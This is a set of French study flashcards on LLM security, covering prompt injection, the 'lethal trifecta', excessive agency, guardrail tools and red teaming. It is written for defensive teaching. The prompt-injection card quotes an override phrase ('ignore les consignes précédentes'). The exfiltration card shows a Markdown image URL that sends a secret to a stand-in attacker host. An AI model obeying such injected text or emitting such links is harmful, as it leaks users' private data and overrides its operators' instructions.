# Sécurité LLM & guardrails — Flashcards
Tags: #flashcards #ai-engineering #securite #guardrails #llm

Qu'est-ce que l'OWASP Top 10 pour les applications LLM ?
?
La liste de référence des **risques de sécurité propres aux LLM** : prompt injection, fuite de données sensibles, supply chain, empoisonnement de données, mauvaise gestion des sorties, **excessive agency**, fuite du system prompt, faiblesses des embeddings, désinformation, consommation non bornée.

---

Qu'est-ce que la prompt injection ?
?
Un texte qui **détourne les instructions du modèle** (« ignore les consignes précédentes et… »). Le modèle ne sépare pas de façon fiable **instructions** et **données** : tout texte dans le contexte peut agir comme une instruction.

---

Injection directe ou indirecte ?
?
- **Directe** : l'utilisateur tape lui-même l'injection
- **Indirecte** : elle est cachée dans un **contenu tiers** que le modèle lit — page web, document [[22-rag-avance|RAG]], e-mail, résultat d'outil ou de serveur [[33-mcp|MCP]]
L'indirecte est la plus dangereuse pour les agents.

---

Qu'est-ce que la « lethal trifecta » ?
?
La combinaison dangereuse (Simon Willison) : un agent qui a **accès à des données privées**, qui **lit du contenu non fiable** et qui peut **communiquer vers l'extérieur**. Une injection peut alors **exfiltrer** les données. Il faut casser au moins une des trois.

---

Comment une exfiltration peut-elle se produire sans outil explicite ?
?
Par exemple via une **image Markdown** dont l'URL contient les données (`![](https://attaquant.com/?d=SECRET)`), chargée automatiquement par l'interface. D'où le filtrage des URLs et du rendu des sorties.

---

Qu'est-ce que l'excessive agency ?
?
Donner à un agent **plus de fonctions, de permissions ou d'autonomie** que nécessaire. Réponse : **moindre privilège** (outils minimaux, droits de l'utilisateur, lecture seule par défaut) et [[31-agents-fondamentaux|human-in-the-loop]] pour les actions sensibles.

---

Pourquoi traiter la sortie du LLM comme une entrée non fiable ?
?
Parce qu'elle peut contenir du **SQL, du HTML/JS ou des commandes shell** injectés : on la **valide et on l'échappe** avant de l'exécuter ou de l'afficher, et on valide les arguments d'un [[32-tool-calling|appel d'outil]] **avant** exécution.

---

Qu'est-ce qu'un guardrail ?
?
Un **contrôle placé autour du modèle** :
- **En entrée** : détection d'injection, de jailbreak, de PII, de sujets interdits
- **En sortie** : toxicité, fuite de données, conformité du format, ancrage dans les sources

---

Quels outils de guardrails existent ?
?
**Llama Guard** et **Prompt Guard** (classifieurs Meta), **NeMo Guardrails** (NVIDIA), **Guardrails AI**, **Presidio** (détection de PII), et les filtres de sécurité des fournisseurs cloud.

---

Comment sécuriser un RAG ?
?
En appliquant les **ACL au moment du retrieval** ([[22-rag-avance|metadata filtering]]) : l'utilisateur ne doit **jamais** récupérer un document qu'il n'a pas le droit de voir, car le modèle le recopierait dans sa réponse.

---

Pourquoi ne pas mettre de secrets dans le system prompt ?
?
Parce qu'il **fuit** : avec assez d'essais, un utilisateur peut le faire répéter. Clés, mots de passe et règles de sécurité doivent vivre **hors du modèle** (code, IAM, [[81-litellm-api-layer|gateway]]).

---

Qu'est-ce que le red teaming LLM ?
?
**Attaquer volontairement** son application (injections, jailbreaks, exfiltration) avant et après la mise en production, manuellement ou avec des outils comme **garak**, **PyRIT** ou **promptfoo**, et transformer les attaques réussies en **tests de régression**.

---

## Connexions
- [[22-rag-avance|RAG avancé]] — injection via documents, ACL
- [[32-tool-calling|Tool calling]] — valider avant d'exécuter
- [[33-mcp|MCP]] — serveurs tiers et résultats d'outils
- [[34-harness-plugins|Harness & plugins]] — permissions et sandbox
- [[81-litellm-api-layer|LiteLLM]] — clés, budgets et rate limits contre la consommation non bornée
- [[38-plateformes-agents|Plateformes d'agents]] — les guardrails comme brique
- [[91-langfuse-observabilite|Langfuse]] — monitorer les abus
- [[39-memoire-agents|Mémoire des agents]] — empoisonnement de la mémoire persistante
- [[00-moc-ai-engineering|MOC AI Engineering]]
